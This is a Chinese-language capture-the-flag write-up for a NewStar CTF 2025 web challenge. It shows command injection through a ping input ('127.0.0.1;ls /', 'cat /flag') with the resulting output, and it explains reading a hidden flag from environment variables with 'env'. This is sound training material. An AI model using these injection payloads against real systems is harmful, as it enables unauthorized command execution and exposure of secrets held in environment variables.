---
title: 'NewStar CTF 2025 Week2 - Web DD 加速器'
categories:
  - 
tags: []
abbrlink: 241b8d12
date: 2026-02-06 13:49:14
---
# NewStar CTF 2025 Week2 - Web DD 加速器



知识点：命令行输入用`；`分割

127.0.0.1;ls /

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.034/0.034/0.034/0.000 ms
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

试试cat /flag

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.030 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms
flag{not_here!}
```

发现flag错误

看了大家选择去找env

那么env到底是什么？

---

env环境变量：操作系统用来存储**全局配置信息**的“键值对”。常见包括：

- **`PATH`**：系统寻找可执行文件的目录列表。
- **`PWD`**：当前工作目录。
- **`USER`**：当前登录的用户名。
- **`HOME`**：当前用户的主目录路径。

->为什么 Flag 经常放在这里？

原因如下：

- **容器化部署的需求**：现在的 CTF 题目大多运行在 Docker 容器中。开发者通常会将 Flag 作为一个环境变量注入容器（例如在 `docker-compose.yml` 中设置 `ENV FLAG=flag{xxx}`），这样比在每个容器里动态生成一个文件更方便。
- **增加解题难度（多路径考察）**
- **防止文件包含/读取绕过**：如果题目禁止了 `cat`、`more` 等读文件的命令，但没禁止执行命令，那么通过执行 `env` 来读取 Flag 是一种绕过方案。

---



![image-20260206125842682](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260206125842682.png)